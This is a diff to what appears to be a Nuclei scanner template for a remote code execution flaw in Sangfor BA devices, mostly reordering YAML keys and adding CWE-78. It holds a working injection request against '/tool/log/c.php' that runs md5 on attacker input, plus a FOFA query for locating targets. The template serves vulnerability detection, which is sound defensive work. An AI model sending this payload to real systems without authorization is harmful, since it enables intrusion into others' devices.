@@ -1,5 +1,4 @@
 id: sangfor-ba-rce
-
 info:
   name: Sangfor BA - Remote Code Execution
   author: ritikchaddha
@@ -11,27 +10,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-77,CWE-78
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
-    max-request: 1
     fofa-query: app="sangfor"
-  tags: rce,sangfor,intrusive,vuln
-
+    max-request: 1
+    verified: true
+  tags: intrusive,rce,sangfor,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+  - matchers:
+      - part: body
+        type: word
         words:
           - '{{md5("{{randstr}}")}}'
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}'
